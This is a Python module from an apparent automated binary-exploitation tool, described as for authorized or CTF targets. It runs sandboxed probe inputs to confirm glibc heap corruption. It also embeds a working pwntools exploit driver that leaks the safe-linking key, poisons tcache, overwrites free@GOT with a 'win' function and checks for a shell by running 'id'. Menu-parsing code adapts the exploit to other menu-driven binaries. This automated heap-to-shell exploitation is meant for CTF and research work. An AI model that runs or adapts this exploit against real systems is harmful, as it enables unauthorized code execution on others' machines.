"""Dynamic heap-corruption confirmation.

Static heuristics (r2_heap) flag malloc/free patterns and UAF/double-free candidates; this
runs the target in the isolated sandbox with a few probe inputs and confirms a real heap bug
when glibc's allocator aborts (double free, corruption, invalid pointer, ...). For
AUTHORIZED / CTF targets."""
from __future__ import annotations

import json
import os
import re
import shutil
import subprocess

from ._sandbox import run_driver

_ABORT = ("free(): ", "double free or corruption", "malloc(): ", "corrupted",
          "invalid pointer", "invalid next size", "smallbin double linked list",
          "unsorted double linked list", "munmap_chunk")

_PROBES = [b"\n", b"f\n", b"o" + b"A" * 200 + b"\n", b"1\n2\n3\n", b"A" * 300 + b"\n",
           b"free\n", b"0\n0\n", b"o\n"]


def autoheap(binary: str) -> dict:
    if not shutil.which("docker"):
        return {"ok": False, "note": "docker no disponible"}
    d = os.path.dirname(os.path.abspath(binary)); name = os.path.basename(binary)
    hits = []
    for probe in _PROBES:
        pf = os.path.join(d, ".heap_probe")
        with open(pf, "wb") as f:
            f.write(probe)
        try:
            r = subprocess.run(
                ["docker", "run", "--rm", "--platform", "linux/amd64", "--network", "none",
                 "--memory", "256m", "--pids-limit", "128", "-v", d + ":/w", "-w", "/w",
                 "gcc:13", "bash", "-c", f"chmod +x ./{name}; ./{name} < .heap_probe 2>&1 | head -12"],
                capture_output=True, text=True, timeout=30)
            out = (r.stdout + r.stderr)
        except subprocess.TimeoutExpired:
            out = ""
        finally:
            try: os.unlink(pf)
            except OSError: pass
        pat = next((p for p in _ABORT if p in out), None)
        if pat:
            kind = ("double-free" if "double free" in out or "free():" in out
                    else "heap-overflow/corruption")
            hits.append({"input": probe.decode("latin-1")[:24], "pattern": pat.strip(),
                         "kind": kind, "output": out.strip()[:300]})
    return {"ok": True, "confirmed": bool(hits), "hits": hits,
            "note": "corrupcion de heap confirmada por abort de glibc (sandbox)" if hits
                    else "no se disparo corrupcion con las entradas de prueba"}


# Heap-to-shell driver for the common menu-driven tcache-UAF shape (new/free/edit/show) with a
# gift `win` and a writable free@GOT (no-PIE / partial RELRO), e.g. the `heapexp` sample. It
# defeats glibc safe-linking WITHOUT needing exact heap offsets: freeing one chunk into an empty
# tcache bin sets its fd = mangle(NULL) = (&chunk >> 12), so `show` leaks that key directly;
# poisoning then uses fd = key ^ target. Runs in the binoracle-pwn sandbox (ASLR off).
_HEAP_SHELL_DRIVER = r'''
import sys, json
from subprocess import STDOUT
from pwn import *
elf = ELF(sys.argv[1], checksec=False); context.binary = elf; context.log_level = "error"
# Menu shape detected statically on the host (new/free/edit/show choice numbers + prompt). The
# host injects it here; the defaults are the heapexp shape so the driver still works standalone.
SPEC = json.loads(r"""__SPEC_JSON__""")
NEW, FREE, EDIT, SHOW = SPEC.get("new", 1), SPEC.get("free", 2), SPEC.get("edit", 3), SPEC.get("show", 4)
PROMPT = SPEC.get("prompt", "> ").encode()
# Fail FAST: if a glibc abort kills the process mid-poison, the next sendlineafter(PROMPT) would
# otherwise block until the outer docker timeout (200s). A short tube timeout makes it raise
# quickly so we still print the stage/dbg diagnostic instead of hanging.
context.timeout = 3
win = (elf.symbols or {}).get("win")
free_got = (elf.got or {}).get("free")
if not win or not free_got:
    print("NOT_APPLICABLE (no win / no free@GOT)"); sys.exit(1)
# glibc's tcache double-free mitigation writes e->key = 0 at chunk+8 for every allocation. When
# we malloc free@GOT as a chunk, that zeroes the ADJACENT GOT slot (free@GOT+8) -- and `win`
# typically calls a libc function (puts) through that very slot, so it would jump to NULL. We
# repair it: read the neighbor's file-initial value (its lazy PLT resolver stub, valid for any
# JUMP_SLOT on a partial-RELRO non-PIE binary) and write it back in the same overwrite.
neigh = free_got + 8
try:
    neigh_lazy = u64(elf.read(neigh, 8))     # initial GOT value from the ELF image = PLT stub
except Exception:
    neigh_lazy = 0
def choose(io, c, idx=None, data=None):
    io.sendlineafter(PROMPT, str(c).encode())
    if idx is not None:
        io.sendline(str(idx).encode())     # menu reads the index on the next line (no prompt)
    if data is not None:
        io.send(data)
try:
    io = process([elf.path], aslr=False, stderr=STDOUT)   # merge glibc aborts into the tube
    # Phase A -- leak the safe-linking key: new(0); free(0) (empty bin -> fd=mangle(NULL));
    # show(0) returns (&0 >> 12); then take chunk 0 back so the bin is empty again.
    choose(io, NEW, 0); choose(io, FREE, 0)
    choose(io, SHOW, 0)
    key = u64(io.recv(8).ljust(8, b"\x00"))
    choose(io, NEW, 0)                       # re-allocate index 0 (tcache empty, count 0)
    def drain(t=0.25):                      # EOF-tolerant read: captures any glibc abort text
        try: return io.recv(timeout=t)
        except Exception: return b""
    # Phase B -- poison, instrumented step by step so we see WHERE it dies and WHAT glibc says.
    stage = "start"; dbg = b""
    try:
        choose(io, NEW, 1)                                          # new(1)
        choose(io, FREE, 1); choose(io, FREE, 0)                    # free(1); free(0) -> count 2
        choose(io, EDIT, 0, p64(key ^ free_got).ljust(0x20, b"\x00"))  # poison fd(0)=mangle(free_got)
        stage = "poisoned"; dbg += drain()
        choose(io, NEW, 2); stage = "malloc1"; dbg += drain()       # malloc -> chunk 0
        choose(io, NEW, 3); stage = "malloc2"; dbg += drain()       # malloc -> free@GOT
        # DIAG (decisive): read chunks[3][:8] BEFORE overwriting. If the poison landed, chunks[3]
        # IS free@GOT, whose current value is the real libc `free` (a 0x7f... pointer); a small or
        # zero value means malloc2 did NOT return free@GOT, so the poison missed the target.
        pre = 0
        try:
            choose(io, SHOW, 3); pre = u64(io.recv(8).ljust(8, b"\x00"))
        except Exception:
            pass
        # *free@GOT = win AND restore free@GOT+8 (zeroed by the tcache key-clear on malloc2), so
        # win's first libc call (e.g. puts) resolves instead of jumping to NULL.
        choose(io, EDIT, 3, p64(win) + p64(neigh_lazy)); stage = "wrote_win"; dbg += drain()
        choose(io, FREE, 2)                                         # free(2) -> free@GOT -> win()
        stage = "triggered"; dbg += b" free_ptr_pre=%#x " % pre; dbg += io.recvrepeat(1.5)
        io.sendline(b"echo BINORACLE_PWNED; id"); dbg += io.recvrepeat(1.5)
    except Exception as e:
        dbg += ("[EOF@%s:%r]" % (stage, str(e))).encode()
    try: io.close()
    except Exception: pass
    ok = b"BINORACLE_PWNED" in dbg or b"win reached" in dbg or b"uid=" in dbg
    if ok:
        print("VERIFIED key=%#x free_got=%#x win=%#x" % (key, free_got, win))
    else:
        tail = dbg[-320:].decode("latin-1", "replace").replace("\n", " | ")
        print("NOT_VERIFIED key=%#x free_got=%#x win=%#x menu=%s stage=%s dbg=%r"
              % (key, free_got, win, SPEC, stage, tail))
except Exception as e:
    print("ERROR", repr(str(e)))
    sys.exit(1)
'''


# --- Menu-shape detection ------------------------------------------------------------------
# The driver above targets a menu-driven tcache-UAF (new/free/edit/show). The heapexp sample
# numbers them 1/2/3/4 with a "> " prompt, but other binaries reorder them, relabel them (often
# in another language), use different separators ("1)" vs "1." vs "[1]") and a different prompt.
# We recover the shape STATICALLY from the binary's own menu string and feed it to the driver,
# so the exploit adapts instead of assuming heapexp's exact numbering.
_OP_KEYWORDS = {
    # order matters: first op whose keyword matches a label claims that option number
    "new":  ("malloc", "alloc", "create", "new", "make", "nuevo", "crear", "reservar",
             "anadir", "add"),
    "free": ("free", "delete", "remove", "release", "liberar", "borrar", "eliminar",
             "quitar", "del"),
    "edit": ("edit", "modify", "fill", "write", "change", "update", "editar", "modificar",
             "escribir", "rellenar", "cambiar"),
    "show": ("show", "print", "view", "dump", "display", "list", "read", "ver", "mostrar",
             "leer", "imprimir", "listar"),
}
_OPT_RE = re.compile(r"(\d{1,2})\s*[\)\.\:\-\]]\s*([A-Za-z][A-Za-z ]{1,24})")
_PROMPT_RE = re.compile(r"[>\$#:»]+\s*$")


def _ascii_strings(path: str, minlen: int = 4):
    # Include \t \n \r in a run so a multi-line menu stored as ONE string (a single puts/printf
    # with embedded newlines, the common case) stays intact; \0 and other control bytes still
    # break runs, so distinct rodata strings remain separate.
    try:
        data = open(path, "rb").read()
    except OSError:
        return []
    return [m.group().decode("latin-1")
            for m in re.finditer(rb"[\x20-\x7e\x09\x0a\x0d]{%d,}" % minlen, data)]


def _trailing_prompt(menu: str, last_end: int) -> str:
    """The input prompt is usually the short token right after the last menu option, e.g.
    '...4)show\n> '. Take the remainder after the last option; if it looks like a prompt
    (ends in >/:/# or is short), use it; else fall back to '> '."""
    tail = menu[last_end:].lstrip("\r\n")
    first = tail.splitlines()[0].strip() if tail.strip() else ""
    if first and (_PROMPT_RE.search(first) or len(first) <= 12):
        return first + (" " if not first.endswith(" ") else "")
    return "> "


def detect_menu_spec(binary: str) -> dict | None:
    """Recover {prompt, new, free, edit, show} from the binary's menu string, or None if no
    single string maps all four operations. Pure static string parsing -- no container."""
    for s in _ascii_strings(binary, 4):
        matches = list(_OPT_RE.finditer(s))
        if len(matches) < 3:
            continue
        numlabel = {int(m.group(1)): m.group(2).strip().lower() for m in matches}
        ops: dict[str, int] = {}
        for op, kws in _OP_KEYWORDS.items():
            for n, lab in numlabel.items():
                if n in ops.values():
                    continue
                if any(re.search(r"\b" + re.escape(k), lab) for k in kws):
                    ops[op] = n
                    break
        if all(k in ops for k in ("new", "free", "edit", "show")) and len(set(ops.values())) == 4:
            prompt = _trailing_prompt(s, matches[-1].end())
            return {"prompt": prompt, **ops}
    return None


def _heap_shell_applicable(binary: str) -> bool:
    """Cheap ELF pre-check (no container): the tcache-UAF->free@GOT->win exploit needs a `win`
    symbol and a `free` symbol. If pyelftools is missing we cannot tell, so we let the driver
    decide; if present and neither is found, skip the (costly) sandbox run entirely."""
    try:
        from elftools.elf.elffile import ELFFile
    except Exception:
        return True
    try:
        names = set()
        with open(binary, "rb") as f:
            elf = ELFFile(f)
            for sec in elf.iter_sections():
                if sec.name in (".symtab", ".dynsym"):
                    for s in sec.iter_symbols():
                        if s.name:
                            names.add(s.name)
        return "win" in names and any("free" in n for n in names)
    except Exception:
        return True


def autoheap_shell(binary: str) -> dict:
    """Drive a menu-driven tcache-UAF (new/free/edit/show) to a verified shell via tcache
    poisoning + free@GOT overwrite. Needs a `win` and a writable free@GOT (no-PIE). The menu
    shape (option numbers + prompt) is detected statically from the binary, so it adapts to
    reordered/relabelled/non-English menus, not just heapexp. Verified by EXECUTION in the
    binoracle-pwn Docker image, or in the native sandbox (unshare/setarch/rlimits) when the
    image is absent; degrades cleanly when neither is available."""
    if not _heap_shell_applicable(binary):
        return {"ok": False, "note": "no aplicable (sin win/free): heap->shell requiere win + free@GOT"}
    spec = detect_menu_spec(binary)
    if spec is None:
        return {"ok": False, "note": "no aplicable: no se detecto un menu new/free/edit/show en el binario"}
    driver = _HEAP_SHELL_DRIVER.replace("__SPEC_JSON__", json.dumps(spec))
    res = run_driver(binary, driver, ".binoracle_heap.py")
    if not res.get("ok"):
        return res
    res["menu"] = spec
    eng = res.get("engine", "sandbox")
    res["note"] = (f"tcache-UAF -> free@GOT=win -> shell (verificado por ejecucion, {eng})"
                   if res.get("verified")
                   else f"no verificado ({eng}): revisa alineacion/glibc o formato del menu")
    return res


def render_heap(r: dict) -> str:
    out = ["## Heap dinamico (confirmacion por ejecucion)\n"]
    if not r.get("ok"):
        return "\n".join(out + ["No disponible: " + r.get("note", "")])
    out.append(f"- corrupcion confirmada: **{'SI' if r.get('confirmed') else 'no'}**")
    for h in r.get("hits", []):
        out.append(f"\n### {h['kind']}  (input {h['input']!r})")
        out.append(f"- glibc: `{h['pattern']}`")
        out.append("```\n" + h["output"] + "\n```")
    if not r.get("hits"):
        out.append("- " + r.get("note", ""))
    return "\n".join(out)
